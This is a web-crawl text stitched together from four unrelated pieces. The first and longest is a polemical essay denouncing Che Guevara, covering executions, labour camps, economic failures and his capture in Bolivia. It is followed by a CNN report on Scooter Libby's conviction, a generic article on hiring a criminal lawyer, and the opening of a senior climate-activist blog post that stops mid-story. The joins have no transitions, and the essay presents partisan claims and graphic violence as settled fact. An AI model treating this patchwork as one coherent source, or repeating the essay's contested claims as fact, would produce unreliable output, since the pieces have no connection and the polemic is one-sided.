“ If you ’re going to kill me , ” he yelled , “ you ’ll have to do it while I ’m standing !
Men die standing ! ”
“ Murderers ! ” the men yelled desperately from their cells .
“ Then we saw Che unholstering his pistol .
He put the barrel to the back of the boys neck and blasted .
The shot almost decapitated the young boy .
“ We erupted …’ Murderers ! — Assassins !'”
His murder finished , Che finally looked up at us , pointed his pistol , and emptied his clip in our direction .
Several of us were wounded by his shots . ”
After a hard day at the office , Che repaired to his new domicile in Tarara , 15 miles outside Havana on the pristine beachfront ( today reserved exclusively for tourists and Communist party members , by the way ) .
The “ austere idealist , ” Che , had n’t done too badly for himself in this real estate transaction , known in non-revolutionary societies as theft .
“ The house was among the most luxurious in Cuba , ” writes Cuban journalist Antonio Llano Montes .
” Until a few weeks prior , it had belonged to Cuba ’s most successful building contractor .
The mansion had a boat dock , a huge swimming pool , seven bathrooms , a sauna , a massage salon and several television sets .
One TV had been specially designed in the U.S. and had a screen ten feet wide and was operated by remote control ( remember , this was 1959 . )
This was thought to be the only TV of its kind in Latin America .
The mansion ’s garden had a veritable jungle of imported plants , a pool with waterfall , ponds filled with exotic tropical fish and several bird houses filled with parrots and other exotic birds .
The habitation was something out of A Thousand and One Nights .
Llano Montes wrote the above in exile .
In January 1959 he did n’t go quite into such detail in his article which appeared in the Cuban magazine Carteles .
He simply wrote that , “ Comandante Che Guevara has fixed his residence in one of the most luxurious houses on Tarara beach . ”
Two days after his article ran , while lunching at Havana ’s El Carmelo restaurant , Llano Montes looked up from his plate to see three heavily armed Rebel army soldiers instructing him to accompany them .
Shortly the journalist found himself in Che Guevara ’s La Cabana office , seated a few feet in front of the Comandante ‘s desk which was piled with papers .
It took half an hour but Che finally made his grand entrance , “ reeking horribly , as was his custom ” recalls Llano Montes .
“ Without looking at me .
He started grabbing papers on his desk and brusquely signing them with ‘ Che . ’
His assistant came in and Che spoke to him over his shoulder .
“ I ’m signing these 26 executions so we can take care of this tonight . ’
“ Then he got up and walked out .
Half an hour later he walks back in and starts signing more papers .
Finished signing , he picks up a book and starts reading — never once looking at me .
Another half hour goes by and he finally puts the book down .
‘ So you ’re Llano Montes , ’ he finally sneers , ‘ who says I appropriated a luxurious house . ’
“ I simply wrote that you had moved into a luxurious house , which is the truth , ” replied Llano Montes .
“ I know your tactics ! ” Che shot back .
“ You press people are injecting venom into your articles to damage the revolution .
You ’re either with us or against us .
We ’re not going to allow all the press foolishness that Batista allowed .
I can have you executed this very night .
How about that ! ”
“ You ’ll need proof that I ’ve broken some law ” responded Montes .
“ ‘ We do n’t need proof .
We manufacture the proof , ’
Che said while stroking his shoulder length hair , a habit of his .
One of his prosecutors , a man nicknamed ‘ Puddle - of - blood ’ then walked in and started talking .
‘ Do n’t let the stupid jabbering of those defense lawyers delay the executions ! ’
Che yelled at him .
‘ Threaten them with execution .
Accuse them of being accomplices of the Batistianos . ’
Then Che jerked the handful of papers from Mr. Puddle and started signing them .
“ This type of thing went on from noon until 6:30 PM when Che finally turned to his aides and said .
‘ Get this man out of here .
I do n’t want him in my presence . ' ”
This was Che ’s manner of dealing with defenseless men .
He acted this way when he held the hammer .
Against armed men on an equal footing his behavior was markedly different .
Two years earlier in the Sierra , Castro had ordered Che to take command over a guerrilla faction led by a fellow 26th of July Movement rebel named Jorge Sotus , who had been operating in an area north of the area where Fidel and Che were and had actually been confronting and fighting Batista ’s army .
Che and a few of his men hiked over to Sotus ’ command station and informed him that Che was now in command .
“ Like hell , ” responded Sotus .
“ It ’s Fidel ’s order , ” responded Guevara .
“ We have more military experience than you and your group . ”
“ More experience in running and hiding from Batista ’s army perhaps , ” Sotus shot back .
Che dithered and Sotus added .
“ Besides my men and I are n’t about to take orders from a foreigner . ”
Che backed off , hiked back and informed Fidel who did n’t press the issue .
But a few weeks after Batista ’s flight and Castro ’s triumph , Sotus was arrested without warning and shoved in the Isle of Pines prison .
The intrepid Sotus managed to escape , made his way to the U.S. and joined an exile paramilitary group , taking part in many armed raids against Cuba from south Florida until the Kennedy - Khrushchev deal ended them .
Guevara also had a run in with a rebel group named the Second Front of the Escambray .
These operated against Batista in the Escambray mountains of Las Villas province .
When Che ’s column entered the area in late 1958 , Che sought to bring these guerrillas under his command and met much resistance , especially from a comandante named Jesus Carreras who knew of Che ’s Communist pedigree .
Again Guevara did n’t press the issue .
A few weeks into the January 1959 triumph Carreras and a group of these Escambray commanders visited Che in La Cabana to address the issue of how they ’d been frozen out of any leadership roles in the new regime .
On the way in , Carreras ran into a rebel he ’d known in the anti-Batista fight and stopped to chat while the rest of the group entered Che ’s office .
Once the group was inside , Che began to rip into Carreras ( who was still not present ) as a drunkard , a womanizer , a bandit and a person he ’d never appoint to any important position .
Midway into Che ’s tirade , Carreras entered the office , having overheard much while outside .
“ Che went white , ” recall those present .
An enraged Carreras jumped right in his face and Che backed off .
Finally Carreras challenged
Che to a duel , “ right outside in the courtyard , ” he pointed .
“ How is it possible , ” Che quickly smiled , “ that two revolutionary companeros get to such a point simply because of a misunderstanding ? ”
The subject was dropped and they turned to other issues , but a year later Jesus Carreras found himself a prisoner in a La Cabana dungeon .
A few months later he was defiantly facing a firing squad .
Fuego !
The volley shattered his body .
And yes ,
Che was watching from his window .
*****
Even the New York Times admits that the first two months of the Cuban Revolution saw 568 firing squad executions .
A study by Cuban - American Scholar Armando Lago doubles that figure .
One by Dr. Claudio Beneda triples it .
The preceding “ trials ” shocked and nauseated all who witnessed them .
They were shameless farces , sickening charades .
Guevara clarified the matter .
“ Evidence is an archaic bourgeois detail , ” he explained .
“ We execute from revolutionary conviction . ”
Not that the slaughter ended after the first few months , as most “ scholars ” imply .
In December 1964 Che addressed the U.N. General Assembly .
“ Yes , we execute , ” he declared to the claps and cheers of that august body .
“ And we will keep executing as long as it is necessary .
This is a war to the death against the Revolution ’s enemies . ”
According to the Black Book of Communism those executions had reached 14,000 by the end of the decade .
( Cuba is a small country .
In American terms , this would amount to more than three million executions . )
On the eve of his trip to New York , Che gave a speech in Santiago Cuba where he declared : “ We must learn the lesson of absolute abhorrence of imperialism .
Against that class of hyena there is no other medium than extermination ! ”
Two years earlier , Guevara had gotten tantalizingly close to that medium .
“ If the missiles had remained we would have used them against the very heart of the United States , including New York , ” he told the London Daily Worker in November of 1962 .
“ We must never establish peaceful co-existence .
We must walk the path of victory even if it costs millions of atomic victims . ”
“ Extermination , ” Che stressed .
“ Millions of atomic victims , ” he said for the record .
“ Pure hate , as the motivating force , ” he repeatedly declared .
****
Time also erred regarding
Che ’s sense of humor , which was on par with Nurse Ratched ’s .
As most Latin Americans of a certain age know , Che was a ringer for a Mexican Movie star of the fifties named Cantinflas .
Shortly after Che entered Havana , one of Cuba ’s traditionally sassy newspapermen made sport of this resemblance .
He did it exactly once .
Those firing squads were working triple - shifts at the time .
The reporter heeded Che ’s warning not to do it again .
In Che ’s first decree when his guerrillas captured the town of Sancti Spiritus in central Cuba during the last days of the skirmishing against Batista ’s army , he outlawed alcohol , gambling and regulated relations between the sexes .
Popular outcry and Fidel ’s good sense made him rescind the order .
“ I have no home , no woman , no parents , no brothers and no friends , ” wrote Guevara .
“ My friends are friends only so long as they think as I do politically . ”
In 1960 at a town named Guanahacabibes in extreme Western Cuba , Che initiated Cuba ’s concentration camp system .
“ We send to Guanahacabibes people who have committed crimes against revolutionary morals .
. it is hard labor … the working conditions are harsh … ”
Among the many categories of criminals against revolutionary morals were “ delinquents . ”
Please take note
Che T - shirt wearers : this “ delinquency ” involved drinking , vagrancy , disrespect for authorities , laziness and playing loud music .
Among the more hilarious manifestations of Che idolatry was the rock musician Carlos Santana ’s grand entrance to the 2005 Academy Awards ceremony where he stopped , swung open his jacket , and proudly displayed his Che T - shirt as the cameras clicked .
By the late 60 ’s among the tens of thousands of inmates at Guanahacabibes and the rest of the UMAP concentration camp system in Cuba were “ roqueros , ” hapless Cuban youths who tried to listen to Yankee - Imperialist rock music .
Carlos Santana , was grinning widely — and oh so hiply — while proudly sporting the symbol of a regime that made it a criminal offense to listen to Carlos Santana .
By late 1964 Minister of Industries ’
Che had so badly crippled Cuba ’s economy and infrastructure and so horribly impoverished and traumatized its work force that the Russians themselves were at wits end .
They were subsidizing the mess , and it was getting expensive — much too expensive for the paltry geopolitical return .
“ This is an underdeveloped country ? ! ” Anastas Mikoyan had laughed while looking around on his first visit to Cuba in 1960 .
The Soviets were frankly tickled to have a developed and civilized country to loot again , like the countries of Eastern Europe after WWII .
Alas , the looting , at first , went in the opposite direction .
Castro was no chump like Ulbricht or Gomulka .
A French Socialist economist , Rene Dumont , tried advising Castro as the wreckage of Cuba ’s economy spiraled out of control .
“ The Cuban Revolution has gone farther in its first three years than the Chinese in its first ten , ” he observed .
Hence the mess .
As Cuba ’s Minister of Industries , Che wanted to refashion human nature .
With hapless Cubans as his guinea pigs , he was intent on creating a “ new socialist man , ” diligent , hard - working , obedient , free from all material incentives and always ready to go with the program — in brief , lobotomized shirkers or smartalecks who offered lip would find themselves behind the barbed wire , watchtowers and guard dogs of Guanahacabibes in short order .
Interestingly , Jack Nicholson whose film character in One Flew Over The Cuckoo ’s Nest continually ran afoul of Nurse Ratched is among Communist Cuba ’s most frequent visitors and Castro ’s most fervent fans .
“ Fidel Castro is a genius ! ” gushed Nicholson after a visit in 1998 .
“ We spoke about everything , ” the actor rhapsodized .
“ Castro is a humanist like President Clinton .
Cuba is simply a paradise ! ”
This may have more to it than the usual Hollywood vacuity upstairs .
“ My job was to bug Jack Nicholson ’s room at the hotel Melia Cohiba when he visited Cuba , ” says high - ranking Cuban intelligence defector Delfin Fernandez , from Madrid today , “ with both cameras and listening devices .
Most people have no idea they are being watched while they are in Cuba .
But their personal activities are filmed under orders from Castro himself .
Famous Americans are the priority objectives of Castro ’s intelligence . ”
One day Che decided that Cubans should learn to play and like soccer ( futbal ) like the citizens of his native Argentina .
A Sugar plantation named Central Macareno near Cienfuegos had been recently stolen from its American owners ( not that most Sugar plantations in Cuba were American - owned as leftist mythology holds .
Barely one - third were . )
The plantation also included a huge orchard of Mango , Avocado and Mamey trees that were just starting to give fruit .
Che ordered them all cut down and the ground razed in order to construct a soccer field .
A year later the field was weed grown , pot-holed and unusable .
The decaying trunks of the formerly fruit - yielding trees were still piled up around the edges of the field even as most Cubans scrambled for fresh fruit on the new black market ( under that arch - villain of leftist lore , Batista , Cubans had no need for a black market . )
At any rate , it seemed that — the threat of Guanahacabibes or not —
Che ’s Cuban subjects simply did n’t take to Che ’s futbal .
Che ’s fetish to “ industrialize ” Cuba immediately and by decree , as he thought his role model Stalin had “ industrialized ” the Soviet Union , ended Cuba ’s status as a relatively developed and civilized country .
In one of his spasms of decrees , Che ordered a refrigerator factory built in Cienfuegos , a pick and shovel factory built in Santa Clara , a pencil factory built in Havana .
Supply ?
Demand ?
Costs ?
Such bourgeois details did n’t interest Che .
None of the factories ended up producing a single product .
Che railed against the chemists in the newly socialized Coca - Cola plant because the Coke they were producing tasted awful .
Some of the flustered chemists responded that it was Che who had nationalized the plant and booted out the former owners and managers , who took the secret Coca - Cola formula with them to the United States .
This impertinence was answered with the threat of Guanahacabibes .
During this time
Che ’s ministry also bought a fleet of snow plows from Czechoslovakia .
Che had personally inspected them and was convinced they could easily be converted into sugar cane harvesting machines , thus mechanizing the harvest and increasing Cuba ’s sugar production .
The snowplows in fact squashed the sugar cane plants , cut them off at the wrong length and killed them .
Four years into the revolution Cuba ’s 1963 sugar production was less than half of its pre-Revolutionary volume .
The Soviets themselves finally put their foot down .
Their Cuban lark was getting expensive .
In 1964 they told Castro that Che had to go .
Castro knew who buttered his bread and had never much liked Che anyway .
Besides , the Revolution was well entrenched by then , and in any case there were many willing executioners now , so Che might have outlived his usefulness .
Here we come to another hoary myth spun by Che ’s hagiographers : his “ ideological ” falling out with the Soviets .
Che ’s pureness of revolutionary heart , we ’re told , led him to clash with the corrupt Soviet nomenklatura .
In fact it was a purely practical conflict .
The Russians were fed up and simply refused to bankroll Che ’s harebrained economic fantasies any longer .
Che saw the writing on the wall .
In December 1964 , right after his visit to the U.N. , he visited his friend Ben Bela in Algeria and delivered his famous anti-Soviet speech , branding them “ accomplices of imperialist exploitation . ”
To many it looked like Che was setting the stage for a role as the Trotsky of his generation .
Che probably saw it as a more seemly role than that of a hopeless economic bumbler .
When he touched down in Havana after the speech , the regime ’s press was absolutely mute regarding both his speech and his recent return .
Soon he was invited to visit the Maximum Leader and Raul .
In fact , Maximum Brother Raul had just returned from Mother Russia itself , where Che ’s Algeria speech had caused quite a stir .
As soon as he got within earshot , both Castros ripped into Guevara as undisciplined , ungrateful and plain stupid .
“ Fidel ! ” Che shot back .
“ Dammit , show me some respect !
I ’m not Camilo ! ”
Che ’s wife , Aleida ( he ’d ditched Hilda by then ) was forced to jump in between the men , exclaiming , “ I ca n’t believe such a thing is happening between longtime companeros . ”
Che finally went home , where he found his telephone lines cut .
Much evidence points to Che being held in house arrest at this point .
And it was under that house arrest that a seriously chastened — and apparently frightened , after all , who better knew the consequences of upsetting the Maximum Leader ? —
Che composed his famous “ Farewell Letter to Fidel , ” in which his groveling and fawning was utterly shameless .
“ I deeply appreciate your lessons and your example … my only fault was not to have had more faith in you since the first moments in the Sierra , not having recognized more quickly your qualities as a leader and a revolutionary .
I will take to my new fields of battle the faith that you have inculcated . ” and on and on in relentless toadying .
Che ’s few public appearances between his return from Algeria and his departure for the Congo always found him in the company of state security personnel .
His Cuban welcome had worn out .
By April 1965 he was in Tanzania with a few dozen black Cuban military men .
Code named “ Tatu , ” Che and his force entered the eastern Congo , which was convulsed at the time ( like now ) by an incomprehensible series of civil ( actually , mostly tribal ) wars .
Tatu ’s mission was to help the alternately Soviet and Chinese backed “ Simbas ” of the Congolese red leader , Laurent Kabila .
These were fighting the forces of the western - backed Moise Tshombe .
Tshombe ’s forces consisted of Belgian foreign legionnaires , mercenaries under the famous “ Mad ” Mike Hoare , Congolese who opposed Kabila , and a handful of Cuban Bay of Pigs veterans sent by the CIA .
The Cubans were mostly pilots who provided close - in air support for “ Mad ” Mike .
Here is Mike Hoare ’s opinion , after watching them in battle , of his CIA allies : “ These Cuban CIA men were as tough , dedicated and impetuous a group of soldiers as I ’ve ever had the honor of commanding .
Their leader [ Rip Robertson ] was the most extraordinary and dedicated soldier I ’ve ever met . ”
Together Mad Mike , Rip and the Cubans made short work of Kabila ’s “ Simbas , ” who were murdering , raping and munching ( many were cannibals ) their way through many of the defenseless Europeans still left in the recently abandoned Belgian colony .
“ Tatu ’s ” first military mission was plotting an attack on a garrison guarding a hydroelectric plant in a place called Front Bendela on the Kimbi River in Eastern Congo .
Che ’s masterstroke was to be an elaborate ambush of the garrison .
Tatu himself was stealthily leading his force into position when ambushers became the ambushed .
Che lost half his men and barely escaped with his life .
His African allies started frowning a little more closely at Tatu ’s c.v. and asking a few questions ( but in Swahili , which he did n’t understand . )
Tatu ’s next clash with the mad dogs of imperialism was at a mountaintop town called Fizi Baraka .
And another hideous rout ensued .
Che admits as much in his Congo Diaries , but he blames it all on Congolese who were terrible soldiers .
Yet , for some reason , the Congolese on Hoare ’s side seemed to fight rather well .
One thing that did impress the Simbas about Tatu was that “ he never went down to the river to wash . ”
*****
Tatu ’s Congo mission was soon abandoned as hopeless and in a humiliating retreat across Lake Tanganyika , Che and the Castro Cubans barely escaped Africa with their lives .
Che now set his sights on Bolivia for the next guerrilla adventure , for living his dream of turning the Andes “ into the Sierra Maestra of the Continent , ” for creating “ two , three many Vietnams . ”
It would be difficult to imagine a more cockamamie plan for Bolivia than Che’s .
Under President Paz Estenssoro in 1952 - 53 Bolivia had undergone a revolution of sorts , with an extensive land reform that — unlike Che ’s and Fidel ’s — actually gave ownership of the land to the peasants , the tillers of the soil themselves , much like Douglas McArthur ’s land reform in post - war Japan .
Even crazier , Che himself , during his famous motorcycle jaunt had visited Bolivia and witnessed the positive results of the reform .
Still , his amazing powers of self - deception prevailed .
Che convinced himself that in a section of Bolivia where the population consisted — not of landless peasants — but of actual homesteaders , he ’d have the locals crowding into his recruitment tent to sign up with a bunch of foreign communists to overthrow the government that had given them their land , a series of rural schools and left them completely unmolested to pursue their lives .
These were Indians highly suspicious of foreigners and especially of white foreigners , to boot .
Che was undaunted by any of these facts .
Hasta la victoria siempre ! as he liked to say .
At this stage in his life Che was probably more deluded than Hitler in his Bunker .
There is no evidence that Castro took the Bolivian mission seriously .
His Soviet patrons were certainly not behind it .
They knew better .
They ’d seen every guerrilla movement in Latin America wiped out .
The only thing these half - baked adventures accomplished was to upset the Americans , with whom they ’d cut a splendid little deal during the Missile Crisis to safeguard Castro .
Why blow this arrangement with another of Che ’s harebrained adventures ?
Much better to work within the system in Latin America , reasoned the Soviets at this time , subtly subverting the governments by using legitimate Communist parties .
A few years later Allende ’s electoral victory in Chile seemed to bear the Soviets out .
In fact , the East German female guerrilla , Tamara Bunke or “ Tania ” who linked up with Che in Bolivia ( they ’d met as early as 1961 and were reputedly lovers ) was actually a KGB - STASI agent sent to keep an eye on Che .
Alas , poor “ Tania ” ( remember Patty Hearst ’s Symbianese Liberation Army moniker ? ) was mowed down by machine gun fire along with her entire “ rearguard ” group after a Bolivian peasant relayed their position to the army and helped plan an ambush .
The Bolivian Communist party itself stood aloof from Che ’s final mission .
Its head , Mario Monje , was a faithful follower of the Soviet party - line .
The only Bolivians Che managed to recruit were renegade Communists and Maoists .
Che ’s guerrilla force averaged 40 - 45 members and was pompously named the “ National Liberation Army . ”
Yet at no point during its 11 month venture did Bolivians make up more than half of its members .
And most of these came from the cities and areas far distant from the guerrilla base .
The rural population shunned their “ National Liberation Army ” like a plague .
“ We cannot develop any peasant support , ” Che admits in his diaries .
“ But it looks like by employing planned terror ( emphasis mine ) we may at least neutralize most of them .
Their support will come later . ”
It never did .
It was the campesinos themselves who kept reporting the guerrilla ’s whereabouts to the army , with whom they were generally on excellent terms .
And for an excellent reason : it was composed mainly of Bolivian campesinos , not bearded foreigners who stole their livestock .
Among the unreported idiocies regarding Che ’s Bolivian debacle , was how he split his forces into a vanguard and a rearguard in April of 1967 , whereupon they got hopelessly lost and bumbled around , half - starved , half - clothed and half - shod , without any contact for 6 months — though they were usually within a mile of each other .
They did n’t even have WWII vintage walkie - talkies to communicate .
Che ’s masterful Guerrilla War , gives no explanation for such a tactic .
Dariel Alarcon , a Cuban who was one of the three guerrillas who managed to survive and escape Bolivia , reports in his book , Benigno ; Memorias de un Soldado Cubano how in the very midst of this blundering around , Che was obsessed with posing for photos .
One was Che atop a ( presumably stolen ) horse on a ridgeline where he was strategically silhouetted against the bare sky .
Che handed Alarcon his Pentax and had him back off just the right distance to capture the entire scene .
Che nodded then plucked out a machete and waved it high over his head , even adding a sound score to the scene , shouting : “ I am the new Bolivar ! ” as Alarcon dutifully clicked away .
While Che was posing for pictures neither he nor anyone in his group had any way to communicate with Cuba .
Castro had sent an agent named Renan Montero to La Paz to keep in touch with Che , but Montero abruptly left Bolivia in July of 1967 and returned to Cuba .
Significantly , just a week earlier , Alexie Kosygin had visited Cuba and met with Castro , where he laid it on the line .
Kosygin had just come from a meeting with Lyndon Johnson where the U.S. President had laid it on the line , complaining about Castroite subversion in Latin America , and how this was a clear breach of the deal the U.S. and Soviets had cut back in October 1962 that had kept Castro unmolested .
Now this mischief in Bolivia might force the U.S. into an agonizing reappraisal of that deal .
Well , Castro did n’t have his heart in the Bolivian adventure anyway .
And now he could finally rid himself of the Argentine popinjay .
Montero came home and Che was cast completely adrift .
Barely two months later the “ National Liberation Army ” was wiped out .
Che ’s capture merits some clarification .
His hagiographers have romanticized his last day alive .
Che was defiant , they claim .
Che was surprised , caught off guard and was unable to properly defend himself or to shoot himself with his last bullet as was his plan .
Nothing in the actual record supports this fantasy .
In fact everything points to Che surrendering quite enthusiastically , right after he ordered his men to fight to the last man and the last bullet .
Most did , but Che was captured with a full clip in his pistol .
Even more suspiciously , though he was in the bottom of a ravine during the final firefight and could have escaped in the opposite direction like a few of his men , Che actually moved upwards and towards the Bolivian soldiers who had been firing .
Yet he was doing no firing of his own in the process .
Then as soon as he saw some soldiers he yelled , “ Do n’t shoot !
I ’m Che ! ”
Immediately after his capture his demeanor was even more interesting “ What ’s your name , young man ? ”
Che asked a soldier .
“ Why what a great name for a Bolivian soldier ! ” he blurted after hearing it .
The firefight was still raging after Che ’s surrender .
His men , unlike their comandante , were indeed fighting to the last bullet .
Soon a wounded Bolivian soldier was carried by .
“ Shall I attend him ? ! ”
Che asked his captors .
“ Why ?
Are you a doctor ? ” asked Bolivian army captain Gary Prado .
“ No , ( the truth at last ! ) but I have some knowledge of medicine , ” answered Guevara , resuming his pathetic attempt to ingratiate himself with his captors .
Another interesting factoid is that Che was captured wearing his famous black beret , and it sported a bullet hole .
Yet those on the Bolivian mission with him like Dariel Alarcon attest that Che never once wore that beret during the Bolivian campaign .
Che had always worn a military cap , all pictures of him in Bolivia back this up .
Some speculate that Che put on his famous black beret ( and even shot a hole in it ) to make a dramatic celebrity surrender and impress his captors .
He probably expected a few snapshots in the process .
After a peaceful capture , Che seemed to have expected a trial which would become a worldwide media sensation , with pleas for his freedom pouring into Bolivia like a blizzard from leftists in every corner of the globe .
This would have been the case had the Bolivians been foolish enough to try him .
The trial of Regis Debray a few months earlier had given them a taste .
Debray was a French Communist journalist who had spent much time in Cuba and was a serious Castro / Che groupie .
He had gone to Bolivia and met with Che and his band and seemed poised to do for Che in Bolivia what Herbert Matthews had done for Castro in Cuba .
But Debray would also act in a more official capacity as a recruiter and messenger for the guerrillas .
Debray was captured by the Bolivian Army , worked over , and sang like a canary about Che ’s presence in Bolivia ( not completely known in April of 1967 ) and what he was up to .
The U.S. was alerted and sent some Green Berets to help train a Ranger Battalion of the Bolivian Army , along with some Cuban - American CIA men to help with intelligence work .
One of these , Felix Rodriguez ( currently President of the Bay of Pigs Veterans Association , and a friend of mine I ’m very , very proud to say ) , convinced the Bolivian military to stop summarily executing all the guerrilla prisoners .
Questioned properly and treated decently , they could provide valuable information and help close the net on Che and his group .
And so it happened with a prisoner named Jose Castillo Chavez .
Rodriguez played good cop with him and deciphered Che ’s whereabouts .
He persuaded the Bolivian military to send their Ranger battalion to the area post - haste .
“ But their training is n’t complete , ” replied the Bolivian commander .
“ No matter ! ” answered Rodriguez .
“ I think we ’ve got Che pin-pointed !
Send them in ! ”
Barely a week later Che was yelling his pitiful plea to those Bolivian Rangers .
“ Do n’t Shoot ! — I ’m Che , I ’m worth more to you alive than dead ! ”
The Bolivian high command did n’t see it that way .
Though he was captured alive , Che was executed the next day .
Compared to the courageous and defiant yells of his own firing squad victims — “ I kneel for no man !
Viva Cuba Libre ! Viva Cristo Rey ! Abajo Comunismo! Aim right HERE ! ” —
Che Guevara proved on his last day alive that he was unworthy to carry his victims ’ slop buckets .

Adjust font size :
WASHINGTON ( CNN ) -- Democratic leaders urged President Bush not to pardon former vice presidential chief of staff I. Lewis " Scooter " Libby , who was convicted on federal charges Tuesday .
Libby 's attorneys , meanwhile , vowed to seek a new trial , or , failing that , to appeal the jury 's verdict .
Libby was convicted of lying and obstructing an investigation into the Bush administration 's actions leading into the Iraq war .
( Watch Democrats use verdict to pressure president )
He resigned after being indicted in October 2005 .
Vice President Dick Cheney , in a written statement , said he was " disappointed with the verdict . "
" I am saddened for Scooter and his family , " Cheney said .
" As I have said before , Scooter has served our nation tirelessly and with great distinction through many years of public service . "
Federal officials began an investigation in December 2003 into how the identity of covert CIA operative Valerie Plame was divulged to reporters in the weeks before Robert Novak named her in a July 14 , 2003 , column .
Libby was not charged with the actual leak .
Novak attributed his information to " two senior administration officials " -- later identified as President Bush 's political adviser , Karl Rove , and Deputy Secretary of State Richard Armitage .
Neither testified in Libby 's trial .
Plame 's husband , former Ambassador Joseph Wilson , had openly questioned part of Bush 's basis for invading Iraq .
He wrote a controversial New York Times op - ed piece that was published July 6 , 2003 .
Prosecutors argued Libby lied about how he learned of Plame 's CIA role to protect his job .
Her role , they said , was deliberately released in retribution for her husband 's report .
( Watch how the conviction played out )
Democrats seize chance to criticize administration
" It 's about time someone in the Bush administration has been held accountable for the campaign to manipulate intelligence and discredit war critics , " said Senate Majority Leader Harry Reid .
" Lewis Libby has been convicted of perjury , but his trial revealed deeper truths about Vice President Cheney 's role in this sordid affair .
Now President Bush must pledge not to pardon Libby for his criminal conduct . "
Added House Speaker Nancy Pelosi , " This trial provided a troubling picture of the inner workings of the Bush administration .
The testimony unmistakably revealed -- at the highest levels of the Bush administration -- a callous disregard in handling sensitive national security information and a disposition to smear critics of the war in Iraq . "
Democratic National Committee Chairman Howard Dean said the investigation should go deeper .
" There 's a lot more going on here than just this , " Dean said on CNN's " The Situation Room . "
" We know that the president was not truthful with the American people when he sent us to war , " he said .
" We do n't know if the president committed a crime or not ; it would be interesting to find that out . "
( Watch Dean tar Bush and Cheney )
However , Dean did not recommend appointing a special prosecutor to investigate Bush .
The leading Democratic presidential hopefuls , Sen. Hillary Clinton of New York and Sen. Barack Obama of Illinois , weighed in as well .
" While justice has been served in the Libby case , the real lesson to come from it is that we must be vigilant in ensuring that the intelligence on burgeoning threats to our nation is beyond reproach , " read a statement on Clinton 's Web site .
Obama said in a statement that Libby 's conviction " underscores what happens when our foreign and national security policies are subverted by politics and ideology . "
Defense blames memory lapses
During 14 days of evidence and testimony , Libby 's lawyers argued that Libby 's heavy workload caused memory lapses when he spoke with investigators .
Jurors who found Libby guilty also found him worthy of sympathy , one juror said .
( Full story )
" We 're not saying we did n't think Mr. Libby was guilty of the things we found him guilty of , but it seemed like ... he was the fall guy , " Denis Collins said .
( Watch a juror explain how there was sympathy for ' fall guy ' Libby )
Wilson and Plame have filed a lawsuit against Libby , Cheney , Bush political adviser Karl Rove and Deputy Secretary of State Richard Armitage .
Wilson told reporters in a teleconference call that the verdict wo n't stop that legal action .
" The vice president was quoted as saying he was sorry for Mr. Libby and his family , " Wilson said .
( Watch Wilson 's reaction to verdict )
" I wish that he would express his sorrow for what has happened to my wife , whose career was destroyed as a result of this , and to the [ military ] service people for a war that was justified by lies and disinformation . "
Libby appears ' somewhat surprised '
As the verdicts were read , Libby blinked and " it seemed as if he was somewhat surprised , " CNN 's Brianna Keilar reported .
( Watch Keilar describe Libby 's wife weeping )
Libby was fingerprinted and released on his own recognizance .
" We are very disappointed in the verdict of the jurors , " lead defense attorney Ted Wells said .
" Despite our disappointment in the jurors ' verdict , we believe in the American justice system , and we believe in the jury system .
" We intend to file a motion for a new trial and , if that is denied , we will appeal the conviction , and we have every confidence that ultimately Mr. Libby will be vindicated . "
He took no questions .
" The jury worked very long and hard and deliberated at length , " said Patrick Fitzgerald , the special prosecutor who led the leak probe .
" The jury was obviously convinced beyond a reasonable doubt that the defendant had lied and obstructed justice in a serious manner . "
" I do not expect to file any further charges , " Fitzgerald said .
" We 're all going back to our day jobs . "
Libby , 56 , faces a maximum sentence of 25 years in prison and a fine of $ 1 million .
A hearing on a presentencing report is scheduled for June 5 .
CNN legal analyst Jeffrey Toobin said , " He is virtually certain to go to prison if this conviction is upheld . "
( Watch Toobin assess Libby 's chances of being pardoned )
Libby initially told investigators he learned about Plame from NBC's Tim Russert .
He later said he got the information from Cheney a month before the telephone conversation with Russert , but forgot about it .
Russert testified that there was no discussion of Plame in that conversation .
CNN 's Kevin Bohn and Paul Courson contributed to this report .
After a felony charge , it ’s essential to hire a lawyer from the best law firm .
Here are seven things to consider when hiring criminal lawyers to help you establish the best defense .
Experience
Hiring a new lawyer has its advantages .
On the one hand , these lawyers tend to take less .
They also strive to work harder to get the best results because they want to build a reputation for themselves .
On the other hand , it is encouraging to hire someone with a lot of experience .
These lawyers were around the block once or twice .
They have worked with a wide range of cases , so they can bring the knowledge they have learned from previous cases to help each case .
Presence in the courtroom
Criminal cases require a trial , even if it ’s just to hear the charges read and plead guilty or innocent .
In the course of the trial , criminal lawyers turn to the judge , speak to the prosecutor ’s office , and present the information to the jury .
If the lawyer does not know what he or she is doing , this can create problems that can destroy the defense .
If a lawyer seems awkward or unreliable , this may ultimately affect how the jury perceives the accused .
Your lawyer needs to know the procedures to follow and present yourself professionally and reliably .
diligence
The best lawyers do not leave a stone unturned when protecting their clients .
They will do their best to provide the best results for each occasion .
Knowledge
Provisions and laws regarding criminal law are constantly changing and evolving .
Lawyers must be aware of and know how to apply these laws in each case .
They should also have rich experience that will help them determine the best approach for each case .
Specialty
Many lawyers specialize in protecting various crimes .
For example , some lawyers specialize in DUIs , drug charges , or violent crimes .
It is essential to find someone who specializes in the type of fees you require .
Track record
What is a lawyer ’s track record for dropping charges , winning a lawsuit , or getting profitable bargains from a prosecution ?
When meeting with a lawyer , it is helpful to ask what the likely outcome of the case will be .
Then make sure their track record gives confidence in the best possible results .
reputations
The lawyer ’s reputation speaks of the level of customer service that the lawyer can provide .
Talk to people who have used a lawyer whom you have considered in the past .
Find out how the experience of previous clients has worked with the lawyers you are considering .
Make sure they work with them again and recommend them to others .
Having studied these characteristics , determine if you are looking for a lawyer from the best law firm in your case .
When so much is at stake , it is essential to find the right lawyer to represent you .
It may come as no surprise to you that Greengranny likes to hide behind the written word .
Email and blogs are a safe haven .
One need not reveal too much or face direct confrontation .
Yet , I am committed to fight global warming in every way I can .
And so , when my post - retirement work took me to professional meetings in Washington DC last week , I had to gather my courage and my wits and bring my activism along .
I realized that going at all weighed heavily on me .
A plane flight across the country is not easily justified , not even by “ offsetting ” the emissions I ’d help produce .
Washington had become a cherished place to me , full of national history and pride , with the added perk of seeing dear friends gathered from all over the country .
That was before the catastrophe of climate change had sunk in .
But , I thought , if I do n’t go , I wo n’t be able to carry the message to them .
I should try this once , to see if I can make a difference .
I flew to Washington with a briefcase of background information , a pocket full of www.greenseniors.org cards , and a lot of trepidation .
Still a rank amateur as an activist , I had only landed two formal appointments with environmental entities based in the nation ’s capital .
